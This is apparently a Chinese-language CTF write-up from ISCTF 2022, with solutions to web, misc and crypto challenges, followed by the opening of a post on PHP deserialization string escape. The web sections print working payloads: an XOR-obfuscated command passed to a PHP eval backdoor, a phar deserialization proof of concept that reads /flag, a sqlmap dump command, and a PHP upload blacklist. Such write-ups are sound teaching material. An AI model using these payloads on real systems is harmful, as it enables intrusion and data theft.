&#123;<br>  <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你能拿到flag吗？&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>PHP8环境</p><p>异或绕过</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">?shell=((<span class="hljs-string">&quot;%08%02%08%08%05%0d&quot;</span>)^(<span class="hljs-string">&quot;%7b%7b%7b%7c%60%60&quot;</span>))<br>((<span class="hljs-string">&quot;%03%01%08%00%00%06%0c%01%07&quot;</span>)^(<span class="hljs-string">&quot;%60%60%7c%20%2f%60%60%60%60&quot;</span>));<br></code></pre></td></tr></table></figure><p>用或也可以，但是取反失败了（不知道为什么</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>给了源码附件，第五空间原题</p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">upload</span>();<br><span class="hljs-comment">// $c-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;;//目标文件</span><br><span class="hljs-comment">// $a-&gt;str = $b;   //触发__tostring</span><br><span class="hljs-comment">// $b-&gt;str[&#x27;str&#x27;] = $c;  //触发__get;</span><br><br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;e.phar&quot;</span>); <span class="hljs-comment">//生成phar文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$c</span>); <span class="hljs-comment">//触发头是C1e4r类</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//生成签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>修改后缀等信息</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323633.png" alt="image-20221030141928680"></p><p>phar反序列化</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?img_name=phar:<span class="hljs-regexp">//u</span>pload/gg.jpg<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323634.png" alt="image-20221030141950138"></p><h2 id="傻柱"><a href="#傻柱" class="headerlink" title="傻柱"></a>傻柱</h2><p>sqlmap跑</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 ./sqlmap<span class="hljs-selector-class">.py</span> -r shazhu<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--dbs</span> -batch <span class="hljs-attr">--level</span>=<span class="hljs-number">3</span> <span class="hljs-attr">--random-agent</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323635.png" alt="image-20221031150200488"></p><p>flag藏在user_agents表的user_agent字段</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323636.png" alt="image-20221031152030375"></p><h2 id="easy-upload1（零解下线）"><a href="#easy-upload1（零解下线）" class="headerlink" title="easy_upload1（零解下线）"></a>easy_upload1（零解下线）</h2><p>黑名单过滤了（没用strtolower）</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.php</span> <span class="hljs-string">.pht</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.php2</span> <span class="hljs-string">.html</span> <span class="hljs-string">.htm</span> <span class="hljs-string">.php3</span> <span class="hljs-string">.php4</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.htaccess</span><br></code></pre></td></tr></table></figure><p>上传后重命名是用md5加密的32位小写字符串</p><p>没给其他信息，猜测后台逻辑为，先上传文件，然后再判断后缀，再删除，需要条件竞争（尝试了一下，失败。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="可爱的emoji"><a href="#可爱的emoji" class="headerlink" title="可爱的emoji"></a>可爱的emoji</h2><p>掩码爆破key得到压缩包密码</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">KEYISAES</span><br></code></pre></td></tr></table></figure><p>很容易想到emoji-aes</p><p><a href="https://aghorler.github.io/emoji-aes/#decrypt">emoji-aes (aghorler.github.io)</a></p><p>key为AES，rotation为9</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323637.png" alt="image-20221027215356890"></p><h2 id="两层编码"><a href="#两层编码" class="headerlink" title="两层编码"></a>两层编码</h2><p>第一层是sha256，套用国赛脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> digits, ascii_letters, punctuation<br>alpha_bet=digits+ascii_letters+punctuation<br>strlist = itertools.product(alpha_bet, repeat=<span class="hljs-number">4</span>)<br><br><br>tail = <span class="hljs-string">&#x27;5CNX82ujhEqhk8Rp&#x27;</span><span class="hljs-comment">#XXXX后的明文</span><br>sh256 = <span class="hljs-string">&#x27;371d61d88ff274d70cd1201faa6a353cee89ec01b4584da5424c604a2ad4238c&#x27;</span><span class="hljs-comment">#加密后的结果</span><br>xxxx=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strlist:<br>    data=i[<span class="hljs-number">0</span>]+i[<span class="hljs-number">1</span>]+i[<span class="hljs-number">2</span>]+i[<span class="hljs-number">3</span>]<br>    data_sha=hashlib.sha256((data+<span class="hljs-built_in">str</span>(tail)).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span>(data_sha==sh256):<br>        xxxx=data<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(xxxx)<br><br></code></pre></td></tr></table></figure><p>但是输入结果后，还需要在五秒内找到key</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">U ha^4 f1v4 s4c0nds to s0lve the pr0bl4m!<br>dmVHWk8yZ2o3aXl6YXJpQ2tsRDZXUVVUcFdkOHhGTXlwb0U0c0tUVVJwa0dzYkZFbUw3RmVHcWt0enVVNER0U1J6d2ZoaGNsbVJWQmpDbGRqc0FKM2hjYlQzdVhxNGMwN3pzZ2hocjVydEgxdGxHdGtwc09FUnppMmxkaDhyN3NhbnVoZndEMUZxbmRUZVVIenVsNjByblR5T3Y5NWxQV1JWRG5aSVlSY2tyeU9xeHBSbDhrREltNmczZFA2a3FvcjJidHJraEV2TXkxbXFVcHZkVkt4WFp4VGp5V3FKU0pQYmFiRVRIZXlOdzBnSzZ1cndoZnhUSXpNUnRBY2NHdHA1UGtqOUZodjZhc1JiSnV4NkdVcEVmdmJjeFpKUjZ1dlBUMEp3NWNmYTFDRjN2YkRBU0NrOHI0VGc3TUN1Zzd4UHFvQ1pENUQwSE96RWlxQWlZYTZ4ODRKbTlFejBScnhoWG5oMWRLdkJEMXd1bU1jVHEyVmdMTHpTM3pDWlFDRVhTZDdlRWxra29HRlJzOHpvdjVxdmlJeE1OVTFHZVhUZTRNaWJtRkFrM0hOSFB3ZzByYmxNOVM2b29pUmFQbTgyVUd0UW5DUHVYUU9wT0xCQzZ0RzJrVlZhVlRQUVRXU0RJeTlWbWI1Yk96MGJ1M2NyQ2ZOV1RKaUNpNDRPUXN2Wmo3QndWUXY4c2c4bWx6eHhyUnhFeFU3aWZWd0o2UGt4allJeFozS3htMmFVaGgyV3BYczgwa3cwbVk5OG5OZUhuZGgwSG5zS3RVU01BRFV4TURsUlFxUlRidEZ0eFVDMEtTZkwycmdBNGM3SEE0Z1h6M2oxcHl6T0FSdDJHUTF3RG1WaVg1bjYwb2U0OEEzWXVMYzJ2NHNUOVBhaU1JQVFpdGp0R09mQ2hSWmJ6UFVJeFJCd3FhRmNtcVBZU1ZISk9xS1RORVhnUEg0YWFjYUYwUDE2cGxrQlJoOTZoMzA4UnlzTzcwTEhRNUU2bVVmQ2cwYTEwTU9RNGxDczlEcURZSEY3ZWJMTzhydVNxWlNiNXV0b1JxZUNHdGtRWktzM1lIaWNCd3JoQk1lTmtWSHdkZDhLMXJTTENET1RQSjlzNW90M0RvTWRSM3hUMzl5SExYRlhldEIxclp4WGNOS21tbjJ1RU5EMVlqaDZnTmlBT01PdFVsUVhNT1lpMDlqd2Zzc2FMY1MzNWNxWEdmeENxdmttQ1RQb29yWTBBMmR5ckw5QXBlQm9McXhQQ3RVSjlLaEMxd1hmN25TenFqTDFFdGRwcUd1MjBCOFlZVzRUcmpFNzBIQkthVmtSY2ZyZjM3Z0RwaWtleXswZGY2NmMxOS04MGQ0LTQyZWEtODVkMS1kMzA3OTczMjk4OWZ9Vkk2SDdCMGtvOUVFRzE2elFtUFF6V3hZT1R2ekhjdzhmNDI5c2RGbmE1elZ4b284SklreU1qQU03NjR4WUFiSE9WQ3lWZ2l2aWxKbFd6VEZaTUhVTllCYXRUcEtkZUdTYWFEVGFPRmdkWFVabmVjWTlvUjA0SlR0VlNNNkoxdHVUcHVWRWpSZVlMQjlFeGJ1cGdWNTZSbXlLMERRU0pLMk11bkhCbk53QXVJMUpUNUlDU1FhMlhlMHN1Y1U4cG9Cb1FRdG93U0lFOUNvN1c4QmVTR1FoNWdKTDU3YXZtWVhoamlLclJjeW53VjZYcUg0TElMaXRWOU5sOFhsU2RKWjZvTEJ4b2lFTTMzV3UzYVNWN2lZMXp2N0p5RGhMUjRMUUpReERKZlBrS0hCWGJ2dHJMMEFNS1NQOWVzdno4NDNVT2oweXY4S09ESVFwVVdUeXhMaDMzQ29LVElyVlV3bzh6Z2lRWHk1emRBaUlUSTFZRGs2ZG1qVGpYM1NHYzFhZ2ZhdWpBaExBWWY5Ymg1Y09tT1hMQUJwYVprT25sTGhlYVBRSE8xUVI1azdLSHJNdjNSM0E5UUhmUFMyVXVSV1dHNXFzZWlSMjVEbEtFR09TMXNNTDUzbk4wR0JiTjJHNDZrclJabjVFVko5alVVTjh1c0l0aVdXcjNMbjM4MjF0eTl6TzBwTEhmZUZ5RXlMYzZBTDZBMmdNMjRqM25Qa0ZSZ3V5dFV6b0ZVQmpLT3JhUkVtWjU3aTF0UWNDZ0JTaFVPeGxJeWd4bnJwUjM0TWhlRWpxeFM3SDRNbWw4bXdab21rN05SYzVPSng2QXJXYzNzU1JwSXVDbUJrMjl6cERTNGZpQzVvc3RibG9aVkcxMWpZVjFMeGdEMjRWZFAwS3NsaWU4Y2w5WmFLTWJXekhjOGpaSlFxdzFGWWc5VFRrS3dZeEw3N2IzdnFHeE5XRm43SlpMdTFMMEE1T0NJTkwycHI2dzF0aXBnMGdSZ2ozMTNCYXNncllsbUU4ckY1bFdXQnRVOWg3OVA3NjIyOEhOQXNuVVJZdXIzTGgyYUZVTWFGOHI1MjFJQzJ6aXpWelZhREloMHNhcTBqeTFVMnJpMlB2b3dDWWtIYzhyTXdXR0hHMk9WUmVFOVFrTjdycEd4czlZYkdiSXhFNEhDS3lXV2p6dE92cFVFYzlNUlBvRGdtaTliVGZqVVE4djBNZDZEZkpQRERjR2lkcjZNeGtVd1h4ZXlMR1hydTZlYklsWUZ5YlBPN3YwRU1wTnVYa0xyQ0R4YUNnSGtZajRSZW9UUkF0b2FIeWVVMXA3VncxcTVDbDZIZg==<br></code></pre></td></tr></table></figure><p>base64解码后再找key，手打时间肯定来不及，后来给hint了，要用pwntools</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> digits, ascii_letters, punctuation<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">first</span>(<span class="hljs-params">tail,sh256</span>):<br>    alpha_bet=digits+ascii_letters+punctuation<br>    strlist = itertools.product(alpha_bet, repeat=<span class="hljs-number">4</span>)<br><span class="hljs-comment"># tail = &#x27;5CNX82ujhEqhk8Rp&#x27;#XXXX后的明文</span><br><span class="hljs-comment"># sh256 = &#x27;371d61d88ff274d70cd1201faa6a353cee89ec01b4584da5424c604a2ad4238c&#x27;#加密后的结果</span><br>    xxxx=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strlist:<br>        data=i[<span class="hljs-number">0</span>]+i[<span class="hljs-number">1</span>]+i[<span class="hljs-number">2</span>]+i[<span class="hljs-number">3</span>]<br>        data_sha=hashlib.sha256((data+<span class="hljs-built_in">str</span>(tail)).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>        <span class="hljs-keyword">if</span>(data_sha==sh256):<br>            xxxx=data<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> xxxx<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    r=remote(<span class="hljs-string">&quot;120.79.18.34&quot;</span>,<span class="hljs-number">20027</span>)<br>    s1=<span class="hljs-built_in">str</span>(r.recv())<br>    <span class="hljs-built_in">print</span>(s1)<br>    reg1=re.findall(<span class="hljs-string">&quot;X\+(.+?)\)&quot;</span>,s1)[<span class="hljs-number">0</span>]<br>    s1=s1.replace(<span class="hljs-string">&quot;== &quot;</span>,<span class="hljs-string">&quot;start&quot;</span>)<br>    s1=s1.replace(<span class="hljs-string">&quot;\\n&quot;</span>,<span class="hljs-string">&quot;end&quot;</span>)<br>    reg2=re.findall(<span class="hljs-string">&quot;start(.*)end&quot;</span>,s1)[<span class="hljs-number">0</span>]<br>    r.recv()<br>    <span class="hljs-built_in">print</span>(reg1)<br>    <span class="hljs-built_in">print</span>(reg2)<br>    req1=first(reg1,reg2)<br>    <span class="hljs-built_in">print</span>(req1)<br>    r.sendline(req1)<br>    r.recv()<br>    s2=<span class="hljs-built_in">str</span>(r.recv()+r.recv())<br>    s2 = s2.replace(<span class="hljs-string">&quot;\\ncan&quot;</span>, <span class="hljs-string">&quot;end&quot;</span>)<br>    <span class="hljs-built_in">print</span>(s2)<br>    <span class="hljs-comment"># s2 = s2.replace(&quot;pr0bl4m!\n&quot;, &quot;start&quot;)</span><br>    <span class="hljs-comment"># s2 = s2.replace(&quot;\ncan&quot;, &quot;end&quot;)</span><br>    <span class="hljs-comment"># reg3 = re.findall(&quot;start(.*)end&quot;, s2)[0]</span><br>    <span class="hljs-comment">#s3 = str(base64.b64decode(reg3))</span><br><br>    s3=re.findall(<span class="hljs-string">&quot;\&#x27;(.*)end&quot;</span>,s2)[<span class="hljs-number">0</span>]<br>    s3=<span class="hljs-built_in">str</span>(base64.b64decode(s3))<br>    reg4 = re.findall(<span class="hljs-string">&quot;key.*&#125;&quot;</span>, s3)[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(reg4)<br>    r.sendline(reg4)<br>    flag=r.interactive()<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323638.png" alt="image-20221028184747201"></p><h2 id="我的Minecraft去哪了"><a href="#我的Minecraft去哪了" class="headerlink" title="我的Minecraft去哪了"></a>我的Minecraft去哪了</h2><p>正版UUID查询</p><p><a href="https://namemc.com/profile/f00001111.1">f00001111 | Minecraft Profile | NameMC</a></p><p><a href="https://mcuuid.net/?q=f00001111">Minecraft UUID &#x2F; Username Converter (mcuuid.net)</a></p><p>得到的结果均为</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">8</span>d<span class="hljs-number">3</span>b<span class="hljs-number">40</span>f<span class="hljs-number">7623742659</span>d<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">98695</span>bd<span class="hljs-number">00446</span><br></code></pre></td></tr></table></figure><p>盗版UUID查询</p><p><a href="http://uuid.hkcdc.org/?name=f00001111">UUID查詢 (hkcdc.org)</a></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323639.png" alt="image-20221028184519652"></p><p>结果为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">8d50700a17d132028f1012284b280ffc<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">8</span>d<span class="hljs-number">50700</span>a<span class="hljs-number">17</span>d<span class="hljs-number">132028</span>f<span class="hljs-number">1012284</span>b<span class="hljs-number">280</span>ffc<span class="hljs-number">8</span>d<span class="hljs-number">3</span>b<span class="hljs-number">40</span>f<span class="hljs-number">7623742659</span>d<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">98695</span>bd<span class="hljs-number">00446</span><br></code></pre></td></tr></table></figure><p>md5加密得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ISCTF</span>&#123;<span class="hljs-number">38884</span>c1ef16e6cba90bb67983512159d&#125;<br></code></pre></td></tr></table></figure><h2 id="下面这些部分记得很简略，没时间复现。"><a href="#下面这些部分记得很简略，没时间复现。" class="headerlink" title="下面这些部分记得很简略，没时间复现。"></a>下面这些部分记得很简略，没时间复现。</h2><h2 id="一个misc手会不懂web吗"><a href="#一个misc手会不懂web吗" class="headerlink" title="一个misc手会不懂web吗"></a>一个misc手会不懂web吗</h2><p>sql注入流量，可逐个提取出ascii码，解码就行。</p><h2 id="简单社工"><a href="#简单社工" class="headerlink" title="简单社工"></a>简单社工</h2><p>台湾巨蛋站</p><h2 id="Docker网络测试"><a href="#Docker网络测试" class="headerlink" title="Docker网络测试"></a>Docker网络测试</h2><p>udp.stream eq 25（仔细看是有ISCTF字样的</p><h2 id="酱紫乱"><a href="#酱紫乱" class="headerlink" title="酱紫乱"></a>酱紫乱</h2><p>脚本先提出所有文字整合，再base64解码，再字频分析得到flag。</p><h2 id="捕风的魔女"><a href="#捕风的魔女" class="headerlink" title="捕风的魔女"></a>捕风的魔女</h2><p>前半段为魔女之旅文字解密，后半段为提瓦特大陆文字，对照解密即可。</p><h2 id="小蓝鲨藏哪了呢"><a href="#小蓝鲨藏哪了呢" class="headerlink" title="小蓝鲨藏哪了呢"></a>小蓝鲨藏哪了呢</h2><p>压缩包套娃，用脚本解压，最后得到一个照片</p><p>zsteg -a一把梭</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323640.png" alt="image-20221031180451998"></p><h2 id="放松一下"><a href="#放松一下" class="headerlink" title="放松一下"></a>放松一下</h2><p>放松一下\.minecraft\logs\latest.log</p><p>日志里面有flag的base64</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323641.png" alt="image-20221101163710095"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">SVNDVEZ7V2VsY29tZV9UT19JU0NURjIwMjJfRU5KT1lfeW91cnNlbGZ9</span><br><span class="language-xml">ISCTF</span><span class="hljs-template-variable">&#123;Welcome_TO_ISCTF2022_ENJOY_yourself&#125;</span><br></code></pre></td></tr></table></figure><h2 id="老色批了奥"><a href="#老色批了奥" class="headerlink" title="老色批了奥"></a>老色批了奥</h2><p>lsb隐写，提取出文件后，使用脚本逆置文件十六进制，得到一个压缩包，解压即得flag。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>没时间复习RSA，所以只写了一题</p><h2 id="呜呜呜我的md5脏了"><a href="#呜呜呜我的md5脏了" class="headerlink" title="呜呜呜我的md5脏了"></a>呜呜呜我的md5脏了</h2><p>栅栏fence解码:<br>因数[5]:<br>分为5栏时，解密结果为：ISCTF{md5_is_11??1??8???}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5hs</span>(<span class="hljs-params">i</span>):<br>    m = hashlib.md5()<br>    m.update(i.encode())<br>    <span class="hljs-keyword">if</span>(m.hexdigest() == <span class="hljs-string">&#x27;88875458bdd87af5dd2e3c750e534741&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>s = <span class="hljs-string">r&#x27;ISCTF&#123;md5_is_11??1??8???&#125;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">100</span>):<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>,<span class="hljs-number">1000</span>):<br>                re=<span class="hljs-string">&quot;ISCTF&#123;md5_is_11&quot;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&quot;1&quot;</span>+<span class="hljs-built_in">str</span>(b)+<span class="hljs-string">&quot;8&quot;</span>+<span class="hljs-built_in">str</span>(c)+<span class="hljs-string">&quot;&#125;&quot;</span><br>                <span class="hljs-keyword">if</span> md5hs(re)==<span class="hljs-literal">True</span>:<br>                    <span class="hljs-built_in">print</span>(re)<br>                    exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323642.png" alt="image-20221028122851313"></p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>2022</tag>
      
      <tag>ISCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过一道题浅谈php反序列化字符逃逸</title>
    <link href="/2022/10/12/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
    <url>/2022/10/12/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<p>moeCTF2022的一道题目，通过此题讲一下反序列化字符逃逸——值逃逸。</p><p>一些文章是以字符串逃逸的位置来分类的</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">键逃逸<br>值逃逸<br></code></pre></td></tr></table></figure><p>我这里是值逃逸，但是讨论的情况是字符串的增加和减少。</p><p>原理是，序列化字符串依据字段内容长度来判断字段内容的归属，而不是依据双引号。</p><h2 id="baby-unserialize（增）"><a href="#baby-unserialize（增）" class="headerlink" title="baby_unserialize（增）"></a>baby_unserialize（增）</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">moectf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;heizi&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span 